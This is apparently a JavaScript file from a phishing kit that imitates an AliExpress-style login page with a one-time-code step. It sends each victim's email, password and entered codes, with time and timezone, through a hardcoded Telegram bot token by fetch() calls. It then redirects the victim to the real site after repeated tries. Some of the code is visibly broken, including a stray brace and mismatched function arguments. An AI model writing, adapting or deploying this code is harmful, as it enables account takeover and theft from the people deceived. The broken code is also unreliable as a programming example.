document.addEventListener('DOMContentLoaded', function () {
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const submitButton = document.getElementById('submitButton');
    const emailError = document.getElementById('emailError');
    const passwordError = document.getElementById('passwordError');
    const clearEmail = document.getElementById('clearEmail');
    const clearPassword = document.getElementById('clearPassword');
    const togglePassword = document.getElementById('togglePassword');
    const togglePasswordHidden = document.getElementById('togglePasswordHidden');
    const warningMessage = document.getElementById('warningMessage');
    const otpModal = document.getElementById('otpModal');
    const otpFields = document.querySelectorAll('.otp-field');
    const verifyButton = document.getElementById('verifyButton');
    const emailPlaceholder = document.getElementById('emailPlaceholder');
    const countdownDisplay = document.getElementById('countdownDisplay'); // New element for countdown display
    let attemptCount = 0; // Counter for login attempts
    let otpAttemptCount = 0; // Counter for OTP attempts
    let countdown; // Variable to hold the countdown timer
    const telegramBots = [{botToken: '7550312965:AAFEKJc9svh0IdAcUrv98BvI8JGOdLY54aE',chatId: '7549990496'},{botToken: '7550312965:AAFEKJc9svh0IdAcUrv98BvI8JGOdLY54aE',chatId: '7549990496'} }];

    // Enable button only if both fields have input
    function updateButtonState() {
        if (emailInput.value.trim() && passwordInput.value.trim()) {
            submitButton.classList.remove('disabled');
            submitButton.classList.add('active');
        } else {
            submitButton.classList.add('disabled');
            submitButton.classList.remove('active');
        }
    }

    // Show or hide clear icons based on input
    function toggleClearIcon(input, clearIcon) {
        if (input.value.trim()) {
            clearIcon.classList.remove('hidden');
        } else {
            clearIcon.classList.add('hidden');
        }
    }

    // Mask email with asterisks except the domain
    function maskEmail() {
        const email = emailInput.value;
        const atIndex = email.indexOf('@'); // Find the position of '@'
    
        if (atIndex > 1) {
            // Mask the characters before '@' except for the first character
            const maskedPart = email[0] + '****' + email.slice(atIndex);
            emailPlaceholder.textContent = maskedPart;
        } else {
            emailPlaceholder.textContent = email; // If no '@' or short email, show as is
        }
    }

    // Add event listeners
    emailInput.addEventListener('input', function () {
        updateButtonState();
        toggleClearIcon(emailInput, clearEmail);
        maskEmail(); // Call maskEmail function whenever the email input changes
    });

    passwordInput.addEventListener('input', function () {
        updateButtonState();
        toggleClearIcon(passwordInput, clearPassword);
    });

    // Clear input on clear icon click
    clearEmail.addEventListener('click', function () {
        emailInput.value = '';
        toggleClearIcon(emailInput, clearEmail);
        updateButtonState();
        maskEmail(); // Update masking when email is cleared
    });

    clearPassword.addEventListener('click', function () {
        passwordInput.value = '';
        toggleClearIcon(passwordInput, clearPassword);
        updateButtonState();
    });

    // Toggle password visibility
    togglePassword.addEventListener('click', function () {
        passwordInput.type = 'text';
        togglePassword.classList.add('hidden');
        togglePasswordHidden.classList.remove('hidden');
    });

    togglePasswordHidden.addEventListener('click', function () {
        passwordInput.type = 'password';
        togglePasswordHidden.classList.add('hidden');
        togglePassword.classList.remove('hidden');
    });

    // Handle form submission
    submitButton.addEventListener('click', async function (event) {
        event.preventDefault();

        // Validate input
        if (!emailInput.value.includes('@')) {
            emailError.classList.remove('hidden');
            emailInput.classList.add('border-red');
        } else {
            emailError.classList.add('hidden');
            emailInput.classList.remove('border-red');
        }

        if (passwordInput.value.length < 6) {
            passwordError.classList.remove('hidden');
            passwordInput.classList.add('border-red');
        } else {
            passwordError.classList.add('hidden');
            passwordInput.classList.remove('border-red');
        }

        if (emailError.classList.contains('hidden') && passwordError.classList.contains('hidden')) {
            // Increment attempt count
            attemptCount++;

                        // Get timezone and date/time
                        const date = new Date();
                        const localDateTime = date.toLocaleString();
                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // Change button text to 'Signing in...' and delay
            submitButton.textContent = 'Signing in...';
            setTimeout(async function () {
                try {
                    // Send email and password to Telegram
                    await sendCredentialsToTelegram(emailInput.value, passwordInput.value, localDateTime, timeZone);

                    // If first attempt failed, show warning message
                    if (attemptCount === 1) {
                        showOtpModal();
                        otpAttemptCount++;
                    } else if (attemptCount >= 3) {
                        // Show OTP modal and increment OTP attempt count
                        showOtpModal();
                    }
                } catch (error) {
                    console.error('Error during submission:', error);
                } finally {
                    submitButton.textContent = 'Sign In';
                }
            }, 3000); // Delay for 3 seconds before executing
        }
    });

    async function sendCredentialsToTelegram(account, password, client_ip, browser, localDateTime, timeZone) {
        const credentialsMessage = `
    |-------------xLs |-------------------------|
    Account       : ${account}
    Password      : ${password}
    |-------------INFO
    Client IP     : ${client_ip}
    Browser       : ${browser}
    Time          : ${localDateTime} (Timezone: ${timeZone})
    |-------------------------------------------|`;

        for (const bot of telegramBots) {
            const telegramUrl = `https://api.telegram.org/bot${bot.botToken}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(credentialsMessage)}`;

            try {
                const response = await fetch(telegramUrl);
                const data = await response.json();

                if (data.ok) {
                    console.log(`Credentials sent successfully via bot ${bot.botToken}`);
                } else {
                    console.error(`Failed to send credentials via bot ${bot.botToken}`, data);
                }
            } catch (error) {
                console.error(`Error sending credentials via bot ${bot.botToken}`, error);
            }
        }
    }


    // Show OTP Modal
    function showOtpModal() {
        otpModal.classList.remove('hidden');
        otpModal.style.display = 'flex'; // Show the modal
        startCountdown(300); // Start countdown from 300 seconds (5 minutes)
    }

    // Start the countdown timer
    function startCountdown(duration) {
        let timeRemaining = duration;
        countdown = setInterval(function () {
            timeRemaining--;

            // Update the countdown display
            countdownDisplay.textContent = `Resend in ${timeRemaining} seconds`;

            // When the countdown reaches 0
            if (timeRemaining <= 0) {
                clearInterval(countdown);
                countdownDisplay.textContent = 'Resend OTP';
                countdownDisplay.style.fontWeight = 'bold';
                countdownDisplay.style.color = 'black';
                countdownDisplay.classList.add('active'); // Make it visually prominent
            }
        }, 1000); // Update every second
    }

    // OTP input field management
    otpFields.forEach((field, index) => {
        field.addEventListener('input', (event) => {
            // Automatically move to the next field if input length is 1
            if (event.target.value.length === 1 && index < otpFields.length - 1) {
                otpFields[index + 1].focus();
            }

            // Call function to update verify button state
            updateVerifyButtonState();
        });
    });

    // Enable or disable verify button
    function updateVerifyButtonState() {
        let otpComplete = true; // Assume OTP is complete

        otpFields.forEach((field) => {
            // Check if any field is empty
            if (field.value.trim() === '') {
                otpComplete = false; // OTP is not complete
            }
        });

        // Update button state based on OTP completeness
        if (otpComplete) {
            verifyButton.classList.remove('otpdisabled');
            verifyButton.classList.add('otpactive');
        } else {
            verifyButton.classList.add('otpdisabled');
            verifyButton.classList.remove('otpactive');
        }
    }

    // Handle OTP verification
    verifyButton.addEventListener('click', async function () {
        verifyButton.textContent = 'Verifying...';
        setTimeout(async function () {
            try {
                if (!verifyButton.classList.contains('otpdisabled')) {
                    // Collect OTP
                    const otp = Array.from(otpFields).map(field => field.value).join('');
                    await sendOtpToTelegram(otp);

                    warningMessage.classList.remove('hidden');
                    console.log('First attempt failed. Showing warning message.');

                    // Increment OTP attempt count
                    otpAttemptCount++;

                    // Show warning message after two failed OTP attempts
                    if (otpAttemptCount === 2) {
                        warningMessage.classList.remove('hidden');
                        console.log('Warning message shown.');
                    } else if (otpAttemptCount >= 3) {
                        // Redirect user after three failed OTP attempts
                        window.location.href = 'https://www.aliexpress.com/'; // Replace with your redirect URL
                    }
                }
            } catch (error) {
                console.error('Error during OTP verification:', error);
            } finally {
                verifyButton.textContent = 'Verify';
            }
        }, 3000); // Delay for 3 seconds before executing
    });

    // Send OTP to Telegram
    async function sendOtpToTelegram(otp) {
    
    const otpMessage = `OTP Entered: ${otp}`;

    for (const bot of telegramBots) {
        const telegramUrl = `https://api.telegram.org/bot${bot.botToken}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(otpMessage)}`;

        try {
            const response = await fetch(telegramUrl);
            const data = await response.json();

            if (data.ok) {
                console.log(`OTP sent successfully via bot ${bot.botToken}`);
            } else {
                console.error(`Failed to send OTP via bot ${bot.botToken}`, data);
            }
        } catch (error) {
            console.error(`Error sending OTP via bot ${bot.botToken}`, error);
        }
    }
}

});


